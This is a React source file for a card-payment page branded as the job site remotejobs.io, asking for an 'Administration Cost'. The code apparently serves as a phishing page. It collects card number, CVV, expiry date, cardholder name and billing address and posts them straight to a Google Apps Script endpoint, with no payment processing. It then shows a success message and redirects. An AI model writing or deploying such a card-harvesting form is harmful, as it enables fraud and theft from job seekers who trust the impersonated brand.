import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import remotelogo from "../src/assets/remote logo.png";

export default function CardPaymentForm() {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    cardNumber: '',
    cvv: '',
    expiry: '',
    name: '',
    billing: ''
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const bodyData = new URLSearchParams(formData);

    try {
      const res = await fetch(
        "https://script.google.com/macros/s/AKfycbxdU10nPN9zuHwoW5pF6qxg5lZCqL4a_Si53hlhl3sIH520uMft5LhgdHG2gSp8-klL/exec",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: bodyData.toString()
        }
      );

      alert("✅ Form submitted successfully!");
      setFormData({ cardNumber: '', cvv: '', expiry: '', name: '', billing: '' });

      // ✅ Redirect to profile page
      navigate('/profile');

    } catch (error) {
      alert("❌ Error! Please try again.");
      console.error(error);
    }
  };

  return (
    <div className="bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center min-h-screen">
      <div className="bg-white shadow-lg rounded-lg w-full max-w-md mt-14 mb-3">

        {/* Logo */}
        <div className="flex items-center justify-start mb-4 bg-blue-900 p-2 mt-0 rounded-[2px]">
          <img src={remotelogo} alt="logo" className="h-6 rounded-[4px]" />
          <span className="text-lg font-semibold text-white ml-2">remotejobs.io</span>
        </div>

        {/* Info Text */}
        <div className="pt-2 px-6 text-sm font-bold">
          <p>
            RemoteJobs.io is an online platform that helps job seekers find legitimate remote job opportunities from companies around the world.
            Our mission is to connect talented professionals with flexible,
            work-from-home positions in fields like tech, marketing, customer service, design, and more.
          </p>
        </div>

        {/* Tags */}
        <div className="px-6 my-2">
          <span className="inline-flex items-center gap-1 text-xl bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-900 font-medium px-2">
            Administration Cost
            <img src={remotelogo} alt="NN Logo" className="w-8 h-6 rounded-[5px]" />
          </span>
        </div>

        {/* Form */}
        <div className="border border-black rounded-lg p-6 mx-7">
          <h2 className="text-lg font-semibold mb-4 text-gray-800 pt-1 text-center">Card Details</h2>

          <form onSubmit={handleSubmit} className="space-y-4 flex flex-col items-center">
            <input
              name="cardNumber"
              type="text"
              placeholder="Card Number"
              value={formData.cardNumber}
              onChange={handleChange}
              className="w-full border border-black rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />

            <input
              name="cvv"
              type="text"
              placeholder="CVV"
              value={formData.cvv}
              onChange={handleChange}
              className="w-full border border-black rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />

            <input
              name="expiry"
              type="text"
              placeholder="Expiry Date (MM/YY)"
              value={formData.expiry}
              onChange={handleChange}
              className="w-full border border-black rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />

            <input
              name="name"
              type="text"
              placeholder="Name on Card"
              value={formData.name}
              onChange={handleChange}
              className="w-full border border-black rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />

            <textarea
              name="billing"
              placeholder="Billing Address"
              value={formData.billing}
              onChange={handleChange}
              className="w-full border border-black rounded-lg px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            ></textarea>

            <button
              type="submit"
              className="w-[160px] bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-900 transition duration-300"
            >
              Submit
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
